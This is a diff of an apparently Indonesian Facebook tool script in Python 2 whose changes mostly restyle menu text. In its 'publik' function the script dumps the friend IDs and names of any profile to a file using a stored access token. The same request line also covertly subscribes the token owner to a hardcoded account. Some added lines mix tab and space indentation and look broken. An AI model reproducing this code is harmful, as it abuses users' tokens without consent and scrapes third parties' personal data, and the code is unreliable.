@@ -65,14 +65,14 @@ def login():
                 except KeyError:
                         exit("\x1b[1;93m╠══◍➤[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Expired")
 	elif login == "2":
-		print("\x1b[1;96m╚══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Youtube")
+		print("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Youtube")
 		time.sleep(2)
 		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
 		exit()
 	elif login == "0":
 		exit()
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m╠══◍➤[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
 def bot_follow():
 	try:
 		token=open('___bangsat___','r').read()
@@ -112,15 +112,16 @@ def publik():
                 time.sleep(2)
                 login()
         try:
-                idt = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
+                idt = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
+                file = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                         req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                         op = json.loads(req.text)
                         print("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                 except KeyError:
                         print('\x1b[1;91m╠══◍➤[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
-                        raw_input("\x1b[1;97m╚══◍➤[\x1b[1;92mKembali\x1b[1;97m]")
+	                print("\x1b[1;92m║")
+                        raw_input("\x1b[1;97m╠══◍➤[\x1b[1;92mKembali\x1b[1;97m]")
                         menu()
                 r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                 id = []
@@ -129,12 +130,13 @@ def publik():
                 for a in z['friends']['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;97m╠══◍➤[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
                 print("\r\x1b[1;92m                     ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
-                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+                print("\x1b[1;97m╠══◍➤[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Selesai")
+                print("\x1b[1;97m╠══◍➤[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
+	        print("\x1b[1;92m║")
+                raw_input("\x1b[1;97m╠══◍➤[\x1b[1;92mKembali\x1b[1;97m]")
                 menu()
 
         except KeyError:
